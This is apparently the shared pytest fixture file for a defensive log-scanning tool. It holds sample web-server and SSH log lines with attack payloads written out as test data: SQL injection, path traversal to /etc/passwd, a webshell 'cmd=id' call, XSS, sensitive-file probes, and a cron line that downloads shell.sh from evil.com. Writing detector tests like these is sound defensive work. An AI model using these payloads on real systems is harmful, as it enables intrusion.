# © VampSecure Studios — VampSecure Labs Security Research Division
"""
conftest.py — Fixtures compartidas para los tests de vamp-log-hunter.

Proporciona ficheros de log de prueba y objetos LogScanner preconfigurados
para reutilización en test_unit.py y test_integration.py.
"""

import sys
import pytest
from pathlib import Path
from rich.console import Console

# Añadir el directorio raíz de la herramienta al path de Python
sys.path.insert(0, str(Path(__file__).parent.parent))

from vamp_log_hunter import LogScanner


# ── Líneas de log de Apache/nginx de referencia ──────────────────────────────

# Petición legítima (esperada: sin hallazgos)
LINEA_LEGITIMA = (
    '127.0.0.1 - - [01/Oct/2026:10:00:00 +0000] '
    '"GET / HTTP/1.1" 200 1234 "-" "Mozilla/5.0"'
)

# Inyección SQL → debe generar CRITICAL
LINEA_SQLI = (
    '192.168.1.5 - - [01/Oct/2026:10:00:02 +0000] '
    '"GET /search?q=\' OR \'1\'=\'1 HTTP/1.1" 200 500 "-" "Mozilla/5.0"'
)

# Path traversal → debe generar HIGH (LFI)
LINEA_LFI = (
    '10.0.0.1 - - [01/Oct/2026:10:00:01 +0000] '
    '"GET /admin/../etc/passwd HTTP/1.1" 404 0 "-" "python-requests/2.28"'
)

# Command injection en webshell (parámetro cmd=) → debe generar CRITICAL
LINEA_WEBSHELL_QUERY = (
    '10.0.0.2 - - [01/Oct/2026:10:00:03 +0000] '
    '"POST /upload.php?cmd=id HTTP/1.1" 200 320 "-" "curl/7.88"'
)

# Acceso a fichero sensible (wp-config.php)
LINEA_SENSIBLE = (
    '10.0.0.3 - - [01/Oct/2026:10:00:04 +0000] '
    '"GET /wp-config.php HTTP/1.1" 200 0 "-" "nikto/2.1"'
)

# Intento de XSS
LINEA_XSS = (
    '10.0.0.4 - - [01/Oct/2026:10:00:05 +0000] '
    '"GET /comment?text=<script>alert(1)</script> HTTP/1.1" 200 100 "-" "Mozilla/5.0"'
)

# auth.log — fallo de contraseña SSH (brute force)
LINEA_AUTH_FAIL = (
    'Oct  1 10:00:00 srv sshd[1234]: '
    'Failed password for root from 172.16.0.99 port 54321 ssh2'
)

# auth.log — login SSH root aceptado
LINEA_ROOT_LOGIN = (
    'Oct  1 10:01:00 srv sshd[1235]: '
    'Accepted password for root from 10.0.0.50 port 22 ssh2'
)

# Cron sospechoso con wget
LINEA_CRON = (
    'Oct  1 03:00:00 srv CRON[999]: '
    'Oct  1 03:00:00 srv CRON[999] CMD (wget http://evil.com/shell.sh -O /tmp/s)'
)

# ── Bloque de log de Apache para integración ─────────────────────────────────

LOG_APACHE_PRUEBA = """\
127.0.0.1 - - [01/Oct/2026:10:00:00 +0000] "GET / HTTP/1.1" 200 1234 "-" "Mozilla/5.0"
10.0.0.1 - - [01/Oct/2026:10:00:01 +0000] "GET /admin/../etc/passwd HTTP/1.1" 404 0 "-" "curl/7.88"
192.168.1.5 - - [01/Oct/2026:10:00:02 +0000] "GET /search?q=' OR '1'='1 HTTP/1.1" 200 500 "-" "Mozilla/5.0"
10.0.0.2 - - [01/Oct/2026:10:00:03 +0000] "GET /index.html HTTP/1.1" 200 800 "-" "sqlmap/1.7"
10.0.0.3 - - [01/Oct/2026:10:00:04 +0000] "GET /.env HTTP/1.1" 200 128 "-" "nikto/2.1"
10.0.0.4 - - [01/Oct/2026:10:00:05 +0000] "GET /page.html HTTP/1.1" 200 600 "-" "Mozilla/5.0"
10.0.0.5 - - [01/Oct/2026:10:00:06 +0000] "GET /wp-config.php HTTP/1.1" 404 0 "-" "gobuster/3.1"
10.0.0.6 - - [01/Oct/2026:10:00:07 +0000] "POST /shell.php?cmd=id HTTP/1.1" 200 320 "-" "curl/7.88"
10.0.0.7 - - [01/Oct/2026:10:00:08 +0000] "GET /about.html HTTP/1.1" 200 700 "-" "Mozilla/5.0"
10.0.0.8 - - [01/Oct/2026:10:00:09 +0000] "GET /contact.html HTTP/1.1" 200 650 "-" "Mozilla/5.0"
"""


@pytest.fixture
def consola():
    """Consola Rich silenciosa para tests (sin salida en terminal)."""
    return Console(quiet=True)


@pytest.fixture
def scanner_basico(consola):
    """LogScanner con configuración por defecto para tests."""
    return LogScanner(
        threshold_brute=5,
        threshold_scan=10,
        last_hours=0,    # sin límite temporal
        console=consola,
    )


@pytest.fixture
def scanner_umbral_bajo(consola):
    """LogScanner con umbral de 2 para forzar hallazgos fácilmente."""
    return LogScanner(
        threshold_brute=2,
        threshold_scan=3,
        last_hours=0,
        console=consola,
    )


@pytest.fixture
def fichero_log_apache(tmp_path):
    """Fichero Apache de prueba con mezcla de tráfico legítimo y ataques."""
    ruta = tmp_path / "access.log"
    ruta.write_text(LOG_APACHE_PRUEBA, encoding="utf-8")
    return ruta


@pytest.fixture
def fichero_log_brute(tmp_path):
    """Access log con 50 intentos fallidos seguidos de la misma IP."""
    lineas = []
    for i in range(50):
        ts = f"01/Oct/2026:10:{i // 60:02d}:{i % 60:02d} +0000"
        lineas.append(
            f'10.0.0.99 - admin [{ts}] "POST /wp-login.php HTTP/1.1" 401 0\n'
        )
    # 5 peticiones legítimas de otra IP
    for i in range(5):
        lineas.append(
            f'192.168.1.1 - - [01/Oct/2026:10:01:{i:02d} +0000] "GET / HTTP/1.1" 200 5000\n'
        )
    ruta = tmp_path / "brute.log"
    ruta.write_text("".join(lineas), encoding="utf-8")
    return ruta
